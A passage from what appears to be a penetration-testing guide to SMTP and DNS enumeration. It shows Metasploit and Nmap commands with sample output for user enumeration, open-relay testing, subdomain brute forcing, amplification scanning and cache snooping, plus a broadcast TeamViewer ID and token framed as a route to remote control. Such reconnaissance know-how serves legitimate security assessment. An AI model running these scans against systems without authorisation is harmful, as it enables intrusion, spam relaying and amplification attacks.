</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/smtp/smtp_enum
</span><span class='line'>services -p 25 -u -R</span></code></pre></td></tr></table></div></figure>


Sample Output
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 10.10.xx.xx:25 Skipping microsoft (220 ftpsrv Microsoft ESMTP MAIL Service, Version: 6.0.3790.4675 ready at  Thu, 3 Mar 2016 18:49:49 +0530 )
</span><span class='line'>[+] 10.10.xx.xx:25 Users found: adm, admin, avahi, avahi-autoipd, bin, daemon, fax, ftp, games, gdm, gopher, haldaemon, halt, lp, mail, news, nobody, operator, postgres, postmaster, sshd, sync, uucp, webmaster, www
</span><span class='line'>[+] 10.10.xx.xx:25 Users found: adm, avahi, avahi-autoipd, backup, bin, daemon, fax, ftp, games, gdm, gopher, haldaemon, halt, lp, mail, news, nobody, operator, postgres, postmaster, sshd, sync, uucp, webmaster, www</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<p><strong>Nmap NSE</strong> has</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/smtp-brute.html">smtp-brute.nse</a> : Performs brute force password auditing against SMTP servers using either LOGIN, PLAIN, CRAM-MD5, DIGEST-MD5 or NTLM authentication.</li>
<li><a href="https://nmap.org/nsedoc/scripts/smtp-commands.html">smtp-commands.nse</a> : Attempts to use EHLO and HELP to gather the Extended commands supported by an SMTP server.</li>
<li><a href="https://nmap.org/nsedoc/scripts/smtp-enum-users.html">smtp-enum-users.nse</a> Attempts to enumerate the users on a SMTP server by issuing the VRFY, EXPN or RCPT TO commands. The goal of this script is to discover all the user accounts in the remote system. Similar to SMTP_ENUM in metasploit.</li>
<li><a href="https://nmap.org/nsedoc/scripts/smtp-open-relay.html">smtp-open-relay.nse</a> Attempts to relay mail by issuing a predefined combination of SMTP commands. The goal of this script is to tell if a SMTP server is vulnerable to mail relaying.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -iL email_servers -v --script=smtp-open-relay -p 25
</span><span class='line'>Nmap scan report for 10.10.xx.xx
</span><span class='line'>Host is up (0.00039s latency).
</span><span class='line'>PORT     STATE  SERVICE
</span><span class='line'>25/tcp   open   smtp
</span><span class='line'>| smtp-open-relay: Server is an open relay (14/16 tests)
</span><span class='line'>|  MAIL FROM:&lt;&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@nmap.scanme.org&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@sysmailsrv.example.com&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;relaytest%nmap.scanme.org@[10.10.8.136]&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;relaytest%nmap.scanme.org@sysmailsrv.example.com&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;"relaytest@nmap.scanme.org"&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;"relaytest%nmap.scanme.org"&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;"relaytest@nmap.scanme.org"@[10.10.8.136]&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;@[10.10.8.136]:relaytest@nmap.scanme.org&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;@sysmailsrv.example.com:relaytest@nmap.scanme.org&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest&gt;
</span><span class='line'>|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest@[10.10.8.136]&gt;
</span><span class='line'>|_ MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest@sysmailsrv.example.com&gt;
</span><span class='line'>MAC Address: 00:50:56:B2:21:A9 (VMware)</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<h3>DNS | Port 53</h3>

<p><strong>Metasploit</strong> provides</p>

<ol>

<li><strong>DNS Bruteforce Enumeration</strong>:  which uses a dictionary to perform a bruteforce attack to enumerate hostnames and subdomains available under a given domain
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/gather/dns_bruteforce</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] Host autodiscover.example.com with address 10.10.xx.xx found
</span><span class='line'>[+] Host b2b.example.com with address 10.10.xx.xx found
</span><span class='line'>[+] Host blog.example.com with address 10.10.xx.xx found</span></code></pre></td></tr></table></div></figure></li>

<li><strong>DNS Basic Information Enumeration</strong> : This module enumerates basic DNS information for a given domain. The module gets information regarding to A (addresses), AAAA (IPv6 addresses), NS (name servers), SOA (start of authority) and MX (mail servers) records for a given domain. In addition, this module retrieves information stored in TXT records.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/gather/dns_info</span></code></pre></td></tr></table></div></figure>

Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] Enumerating example.com
</span><span class='line'>[+] example.com - Address 93.184.xx.xx found. Record type: A
</span><span class='line'>[+] example.com - Address 2606:2800:220:1:248:1893:25c8:1946 found. Record type: AAAA
</span><span class='line'>[+] example.com - Name server a.iana-servers.net (199.43.xx.xx) found. Record type: NS
</span><span class='line'>[+] example.com - Name server a.iana-servers.net (2001:500:8c::53) found. Record type: NS
</span><span class='line'>[+] example.com - Name server b.iana-servers.net (199.43.xx.xx) found. Record type: NS
</span><span class='line'>[+] example.com - Name server b.iana-servers.net (2001:500:8d::53) found. Record type: NS
</span><span class='line'>[+] example.com - sns.dns.icann.org (199.4.xx.xx) found. Record type: SOA
</span><span class='line'>[+] example.com - sns.dns.icann.org (64:ff9b::c704:1c1a) found. Record type: SOA
</span><span class='line'>[+] example.com - Text info found: v=spf1 -all . Record type: TXT
</span><span class='line'>[+] example.com - Text info found: $Id: example.com 4415 2015-08-24 20:12:23Z davids $ . Record type: TXT
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure></li>

<li><strong>DNS Reverse Lookup Enumeration</strong>: This module performs DNS reverse lookup against a given IP range in order to retrieve valid addresses and names.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/gather/dns_reverse_lookup</span></code></pre></td></tr></table></div></figure>
</li>
<li> <strong>DNS Common Service Record Enumeration</strong> : This module enumerates common DNS service records in a given domain.
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/gather/dns_srv_enum
</span><span class='line'>set domain example.com
</span><span class='line'>run
</span><span class='line'>
</span><span class='line'>[*] Enumerating SRV Records for example.com
</span><span class='line'>[+] Host: sipfed.online.lync.com IP: 10.10.xx.xx Service: sipfederationtls Protocol: tcp Port: 5061 Query: _sipfederationtls._tcp.example.com
</span><span class='line'>[+] Host: sipfed.online.lync.com IP: 2a01:XXX:XXXX:2::b Service: sipfederationtls Protocol: tcp Port: 5061 Query: _sipfederationtls._tcp.example.com
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure></li>

<li><strong>DNS Record Scanner and Enumerator</strong> : This module can be used to gather information about a domain from a given DNS server by performing various DNS queries such as zone transfers, reverse lookups, SRV record bruteforcing, and other techniques.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/gather/enum_dns</span></code></pre></td></tr></table></div></figure>

Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] Setting DNS Server to zonetransfer.me NS: 81.4.xx.xx
</span><span class='line'>[*] Retrieving general DNS records
</span><span class='line'>[*] Domain: zonetransfer.me IP address: 217.147.xx.xx Record: A 
</span><span class='line'>[*] Name: ASPMX.L.GOOGLE.COM. Preference: 0 Record: MX
</span><span class='line'>[*] Name: ASPMX3.GOOGLEMAIL.COM. Preference: 20 Record: MX
</span><span class='line'>[*] Name: ALT1.ASPMX.L.GOOGLE.COM. Preference: 10 Record: MX
</span><span class='line'>[*] Name: ASPMX5.GOOGLEMAIL.COM. Preference: 20 Record: MX
</span><span class='line'>[*] Name: ASPMX2.GOOGLEMAIL.COM. Preference: 20 Record: MX
</span><span class='line'>[*] Name: ASPMX4.GOOGLEMAIL.COM. Preference: 20 Record: MX
</span><span class='line'>[*] Name: ALT2.ASPMX.L.GOOGLE.COM. Preference: 10 Record: MX
</span><span class='line'>[*] zonetransfer.me.        301     IN      TXT     
</span><span class='line'>[*] Text: zonetransfer.me.        301     IN      TXT     
</span><span class='line'>[*] Performing zone transfer against all nameservers in zonetransfer.me
</span><span class='line'>[*] Testing nameserver: nsztm2.digi.ninja.
</span><span class='line'>W, [2016-04-05T22:53:16.834590 #15019]  WARN -- : AXFR query, switching to TCP
</span><span class='line'>W, [2016-04-05T22:53:17.490698 #15019]  WARN -- : Error parsing axfr response: undefined method `+' for nil:NilClass
</span><span class='line'>W, [2016-04-05T22:53:32.047468 #15019]  WARN -- : Nameserver 167.88.xx.xx not responding within TCP timeout, trying next one
</span><span class='line'>F, [2016-04-05T22:53:32.047746 #15019] FATAL -- : No response from nameservers list: aborting
</span><span class='line'>[-] Zone transfer failed (length was zero)
</span><span class='line'>[*] Testing nameserver: nsztm1.digi.ninja.
</span><span class='line'>W, [2016-04-05T22:53:33.269318 #15019]  WARN -- : AXFR query, switching to TCP
</span><span class='line'>W, [2016-04-05T22:53:33.804121 #15019]  WARN -- : Error parsing axfr response: undefined method `+' for nil:NilClass
</span><span class='line'>W, [2016-04-05T22:53:48.481319 #15019]  WARN -- : Nameserver 81.4.xx.xx not responding within TCP timeout, trying next one
</span><span class='line'>F, [2016-04-05T22:53:48.481519 #15019] FATAL -- : No response from nameservers list: aborting
</span><span class='line'>[-] Zone transfer failed (length was zero)
</span><span class='line'>[*] Enumerating SRV records for zonetransfer.me
</span><span class='line'>[*] SRV Record: _sip._tcp.zonetransfer.me Host: www.zonetransfer.me. Port: 5060 Priority: 0
</span><span class='line'>[*] Done
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>
</li>
Two interesting metasploit modules which we found are
<li>
<strong>DNS Amplification Scanner</strong> which tests for the DNS Amplification Tests.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>auxiliary/scanner/dns/dns_amp
</span><span class='line'>services -p 53 -u -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] Sending 67 bytes to each host using the IN ANY isc.org request
</span><span class='line'>[+] 10.10.xx.xx:53 - Response is 401 bytes [5.99x Amplification]
</span><span class='line'>[+] 10.10.xx.xx:53 - Response is 417 bytes [6.22x Amplification]
</span><span class='line'>[+] 10.10.xx.xx:53 - Response is 401 bytes [5.99x Amplification]
</span><span class='line'>[+] 10.10.xx.xx:53 - Response is 230 bytes [3.43x Amplification]</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>DNS Non-Recursive Record Scraper</strong> which can be used to scrape records that have been cached by a specific nameserver. Thinking of what all can be discovered from this module is the antivirus softwares used by the company, websites visited by the employees. It uses dns norecurse option.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/gather/dns_cache_scraper </span></code></pre></td></tr></table></div></figure>

Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] Making queries against 103.8.xx.xx
</span><span class='line'>[+] dnl-01.geo.kaspersky.com - Found
</span><span class='line'>[+] downloads2.kaspersky-labs.com - Found
</span><span class='line'>[+] liveupdate.symantecliveupdate.com - Found
</span><span class='line'>[+] liveupdate.symantec.com - Found
</span><span class='line'>[+] update.symantec.com - Found
</span><span class='line'>[+] update.nai.com - Found
</span><span class='line'>[+] guru.avg.com - Found
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure></li>
</ol>


<p><strong>Nmap</strong> has around 19-20 NSE Scripts for DNS, we haven&rsquo;t mentioned all the NSE here, only which we were able to use.:</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/broadcast-dns-service-discovery.html">broadcast-dns-service-discovery.nse</a> Attempts to discover hosts' services using the DNS Service Discovery protocol. It sends a multicast DNS-SD query and collects all the responses.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> nmap --script=broadcast-dns-service-discovery
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-12 14:53 IST
</span><span class='line'>Pre-scan script results:
</span><span class='line'>| broadcast-dns-service-discovery: 
</span><span class='line'>|   172.30.xx.xx
</span><span class='line'>|     9/tcp workstation
</span><span class='line'>|       Address=172.30.xx.xx fe80:0:0:0:3e97:eff:fe9a:51b
</span><span class='line'>|     22/tcp udisks-ssh
</span><span class='line'>|       Address=172.30.xx.xx fe80:0:0:0:3e97:eff:fe9a:51b
</span><span class='line'>|   172.30.xx.xx
</span><span class='line'>|     2020/tcp teamviewer
</span><span class='line'>|       DyngateID=164005815
</span><span class='line'>|       Token=CrzebHH5rkzIEBsP
</span><span class='line'>|       UUID=119e36d8-4366-4495-9e13-c44be02851f0
</span><span class='line'>|_      Address=172.30.xx.xx fe80:0:0:0:69ab:44d5:e21d:738e
</span><span class='line'>WARNING: No targets were specified, so 0 hosts scanned.
</span><span class='line'>Nmap done: 0 IP addresses (0 hosts up) scanned in 7.24 seconds</span></code></pre></td></tr></table></div></figure>

It's surprising why teamviewer will broadcast it's ID, then we mostly need 4 digit pin just to control the machine.
</li>
<li><a href="https://nmap.org/nsedoc/scripts/dns-blacklist.html">dns-blacklist.nse</a> ( External IP Only ) Checks target IP addresses against multiple DNS anti-spam and open proxy blacklists and returns a list of services for which an IP has been flagged</li>
<li><a href="https://nmap.org/nsedoc/scripts/dns-brute.html">dns-brute.nse</a>: This is similar to the msf dns_bruteforce module. Attempts to enumerate DNS hostnames by brute force guessing of common subdomains.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script dns-brute www.example.com -sn -n -Pn
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-05 23:23 IST
</span><span class='line'>Nmap scan report for www.example.com (116.50.xx.xx)
</span><span class='line'>Host is up.
</span><span class='line'>Other addresses for www.example.com (not scanned): 64:ff9b::7432:4fd0
</span><span class='line'>
</span><span class='line'>Host script results:
</span><span class='line'>| dns-brute: 
</span><span class='line'>|   DNS Brute-force hostnames: 
</span><span class='line'>|     mx1.example.com - 64:ff9b:0:0:0:0:cbc7:2989
</span><span class='line'>|     images.example.com - 116.50.xx.xx
</span><span class='line'>|     images.example.com - 64:ff9b:0:0:0:0:7432:404b
</span><span class='line'>|     dns.example.com - 116.50.xx.xx
</span><span class='line'>|     dns.example.com - 64:ff9b:0:0:0:0:7432:42e6
</span><span class='line'>|     web.example.com - 203.199.xx.xx
</span><span class='line'>|     web.example.com - 64:ff9b:0:0:0:0:cbc7:2911
</span><span class='line'>|     exchange.example.com - 203.199.xx.xx
</span><span class='line'>|     mail.example.com - 116.50.xx.xx
</span><span class='line'>|     exchange.example.com - 64:ff9b:0:0:0:0:cbc7:29a7
</span><span class='line'>|     mail.example.com - 64:ff9b:0:0:0:0:7432:4fe7
</span><span class='line'>|     blog.example.com - 116.50.xx.xx
</span><span class='line'>|     blog.example.com - 64:ff9b:0:0:0:0:7432:4ebb
</span><span class='line'>|     www.example.com - 116.50.xx.xx
</span><span class='line'>|     www.example.com - 64:ff9b:0:0:0:0:7432:4fd0
</span><span class='line'>|     sip.example.com - 116.50.xx.xx
</span><span class='line'>|     sip.example.com - 116.50.xx.xx
</span><span class='line'>|     sip.example.com - 64:ff9b:0:0:0:0:7432:4e56
</span><span class='line'>|     sip.example.com - 64:ff9b:0:0:0:0:7432:4ec9
</span><span class='line'>|     mobile.example.com - 116.50.xx.xx
</span><span class='line'>|_    mobile.example.com - 64:ff9b:0:0:0:0:7432:4e18
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds</span></code></pre></td></tr></table></div></figure></li>

<li><a href="https://nmap.org/nsedoc/scripts/dns-cache-snoop.html">dns-cache-snoop.nse</a> : This module is similar to dns_cache_scraper. Performs DNS cache snooping against a DNS server. The default list of domains to check consists of the top 50 most popular sites, each site being listed twice, once with "www." and once without. Use the dns-cache-snoop.domains script argument to use a different list.
<br>
<br>
Sample Output with no arguments:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sU -p 53 --script dns-cache-snoop.nse 103.8.xx.xx
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-05 23:30 IST
</span><span class='line'>Nmap scan report for ns5.tataidc.co.in (103.8.xx.xx)
</span><span class='line'>Host is up (0.067s latency).
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>53/udp open  domain
</span><span class='line'>| dns-cache-snoop: 83 of 100 tested domains are cached.
</span><span class='line'>| google.com
</span><span class='line'>| www.google.com
</span><span class='line'>| facebook.com
</span><span class='line'>| www.facebook.com
</span><span class='line'>| youtube.com
</span><span class='line'>| www.youtube.com
</span><span class='line'>| yahoo.com
</span><span class='line'>| www.yahoo.com</span></code></pre></td></tr></table></div></figure>

Sample Output with custom list of websites:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sU -p 53 --script dns-cache-snoop.nse --script-args 'dns-cache-snoop.mode=timed,dns-cache-snoop.domains={dnl-01.geo.kaspersky.com,update.symantec.com,host3.com}' 103.8.xx.xx
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-05 23:33 IST
</span><span class='line'>Nmap scan report for ns5.tataidc.co.in (103.8.xx.xx)
</span><span class='line'>Host is up (0.11s latency).
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>53/udp open  domain
</span><span class='line'>| dns-cache-snoop: 2 of 3 tested domains are cached.
</span><span class='line'>| dnl-01.geo.kaspersky.com
</span><span class='line'>|_update.symantec.com</span></code></pre></td></tr></table></div></figure>
</li>

<li><a href="https://nmap.org/nsedoc/scripts/dns-check-zone.html">dns-check-zone.nse</a> :  Checks DNS zone configuration against best practices, including RFC 1912. The configuration checks are divided into categories which each have a number of different tests.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sn -Pn aster.example.co.in --script dns-check-zone --script-args='dns-check-zone.domain=example.com'
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-06 09:33 IST
</span><span class='line'>Nmap scan report for aster.example.co.in (202.191.xx.xx)
</span><span class='line'>Host is up.
</span><span class='line'>Other addresses for aster.example.co.in (not scanned): 64:ff9b::cabf:9a42
</span><span class='line'>rDNS record for 202.191.xx.xx: segment-202-191.sify.net
</span><span class='line'>
</span><span class='line'>Host script results:
</span><span class='line'>| dns-check-zone: 
</span><span class='line'>| DNS check results for domain: example.com
</span><span class='line'>|   MX
</span><span class='line'>|     PASS - Reverse MX A records
</span><span class='line'>|       All MX records have PTR records
</span><span class='line'>|   SOA
</span><span class='line'>|     PASS - SOA REFRESH
</span><span class='line'>|       SOA REFRESH was within recommended range (3600s)
</span><span class='line'>|     PASS - SOA RETRY
</span><span class='line'>|       SOA RETRY was within recommended range (600s)
</span><span class='line'>|     PASS - SOA EXPIRE
</span><span class='line'>|       SOA EXPIRE was within recommended range (1209600s)
</span><span class='line'>|     PASS - SOA MNAME entry check
</span><span class='line'>|       SOA MNAME record is listed as DNS server
</span><span class='line'>|     PASS - Zone serial numbers
</span><span class='line'>|       Zone serials match
</span><span class='line'>|   NS
</span><span class='line'>|     FAIL - Recursive queries
</span><span class='line'>|       The following servers allow recursive queries: 45.33.xx.xx
</span><span class='line'>|     PASS - Multiple name servers
</span><span class='line'>|       Server has 2 name servers
</span><span class='line'>|     PASS - DNS name server IPs are public
</span><span class='line'>|       All DNS IPs were public
</span><span class='line'>|     PASS - DNS server response
</span><span class='line'>|       All servers respond to DNS queries
</span><span class='line'>|     PASS - Missing nameservers reported by parent
</span><span class='line'>|       All DNS servers match
</span><span class='line'>|     PASS - Missing nameservers reported by your nameservers
</span><span class='line'>|_      All DNS servers match
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 6.05 seconds</span></code></pre></td></tr></table></div></figure>
</li>

<li><a href="https://nmap.org/nsedoc/scripts/dns-nsid.html">dns-nsid.nse</a>: Retrieves information from a DNS nameserver by requesting its nameserver ID (nsid) and asking for its id.server and version.bind values.
<br>
<br>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sSU -p 53 --script dns-nsid 202.191.xx.xx
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-04-06 09:37 IST
</span><span class='line'>Nmap scan report for segment-202-191.sify.net (202.191.xx.xx)
</span><span class='line'>Host is up (0.097s latency).
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>53/tcp open  domain
</span><span class='line'>53/udp open  domain
</span><span class='line'>| dns-nsid: 
</span><span class='line'>|_  bind.version: 9.3.3rc2
</span><span class='line'>
